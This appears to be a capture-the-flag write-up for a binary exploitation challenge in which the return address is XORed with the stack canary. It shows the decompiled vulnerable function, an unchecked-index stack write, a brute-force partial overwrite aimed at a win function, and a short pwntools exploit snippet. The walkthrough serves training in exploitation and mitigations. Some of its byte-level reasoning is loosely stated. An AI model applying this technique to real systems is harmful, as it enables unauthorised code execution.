# PTR Protection

**Category:** Mitigations

## Overview

```text
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

```text
void __cdecl challenge()
{
  int index; // [rsp+Ch] [rbp-44h]
  char buffer[24]; // [rsp+30h] [rbp-20h]
  unsigned __int64 v2; // [rsp+48h] [rbp-8h]
  unsigned __int64 retaddr; // [rsp+58h] [rbp+8h]

  v2 = __readfsqword(0x28u);
  retaddr ^= v2;
  index = 0;
  while ( index >= 0 )
  {
    printf("Enter index: ");
    index = get_int();
    if ( index >= 0 )
    {
      printf("Enter data: ");
      buffer[index] = get_int();
    }
  }
  printf("return %p\n", (const void *)(v2 ^ retaddr));
}
```
From the decompiled code of the `challenge` function we can see that the canary is xored with the return address.
The function logic allows the user to write an integer in an arbitrary position in the stack because the index given by the user is never checked, leading to a buffer overflow.

In the binary there is also a `win` function that prints the flag

## Analysis
Due to the xoring between canary and return address we cannot simply overwrite the return address with the `win` function address.
The binary saves the return address xored with the canary and, before the `ret` instruction, it retrieves the original return address by xoring it again with the canary.
We can leverage the fact that canary's least significant byte is always 0x00, which reduces the number of brute force attempts we have to perform.
In fact the least significant byte of the return address remains the same after the xor operation.


Original saved EIP: AA AA

Canary:             CC 00

Win offset:         A2 23

Saved EIP after xor: AAAA xor CC00 = 66AA


The high nibble is the same between the saved EIP and win offset since they share the same binary.


Since we cannot know the value of the canary at runtime, we have to bruteforce what remains not fixed.
The nibble we actually need to fix is the one marked with X:

A X 2 3 <- X is the nibble we cannot set deterministically

The nibble we'd actually want to fix is only the low one of the second byte (A->2). But since the binary lets us write whole bytes, we are forced to overwrite the high nibble too, and the whole byte then gets xored with an unknown canary byte — so the entire second byte is randomized, giving a 1/256 success probability.



## Vulnerability
Buffer overflow in `buffer`, the index provided by the user for the write is never checked


## Exploitation

The core of the script is the receive and send:
```python
    r.recvuntil(b"index: ")
    r.sendline(b"40")
    r.recvuntil(b"data: ")
    r.sendline(b"124")
    r.sendline(b"41")
    r.recvuntil(b"data: ")
    r.sendline(b"2")
```

